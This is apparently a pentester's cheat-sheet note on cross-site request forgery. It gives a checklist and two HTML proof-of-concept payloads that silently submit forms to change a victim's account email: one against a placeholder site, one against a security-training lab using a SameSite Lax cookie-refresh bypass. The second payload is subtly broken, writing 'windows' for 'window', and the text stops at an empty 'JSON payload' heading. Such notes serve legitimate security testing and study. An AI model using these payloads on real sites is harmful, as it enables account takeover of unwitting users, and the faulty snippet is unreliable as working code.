Payload generator: https://csrfshark.github.io/app/
- [ ] Session handling mechanism (token, csrf, JWT)
- [ ] Identify cookie protections (HTTPOnly, Secure, SameSite)
- [ ] Identify gadgets and interesting endpoints
Form submission payload
- Sending a GET request before form submission
```html
<html> 
	<body> <!-- this is to send a GET request before form submission --> 
	<img src=http://vulnerable-website.com/path onerror='document.forms[0].submit()'> 
	<form action="https://vulnerable-website.com/email/change" method="POST">
		<input type="hidden" name="email" value="pwned@evil-user.net" />
	</form> 
	
<script> document.forms[0].submit(); </script> 
	</body> 
</html>
```
Refresh token onclick (Chromium browser when SameSite not set, 120s time window)
```html
<!DOCTYPE html>
<html lang="en"> 
<body> 
<h1>Form CSRF PoC</h1> 
	<form method="POST" action="https://0a2400b603f490d68220296600b80036.web-security-academy.net/my-account/change-email"> 
		<input type="hidden" name="email" value="pwn@csrf.com"> 
		<input type="submit" value="Submit Request"> 
	</form> 
</body> 
<script> // This CSRF payload when user click on page: // - sends a request to refresh cookie endpoint // - wait for cookie refresh, then submit form (SameSite: Lax bypass) 
	windows.onclick = () => {
		windows.open('https://0a2400b603f490d68220296600b80036.web-security-academy.net/social-login'); 
		setTimeout(sendForm, 10000); 
	} 
	
	function sendForm() { 
		document.forms[0].submit(); 
	} 
</script> 
</html>
```
JSON payload
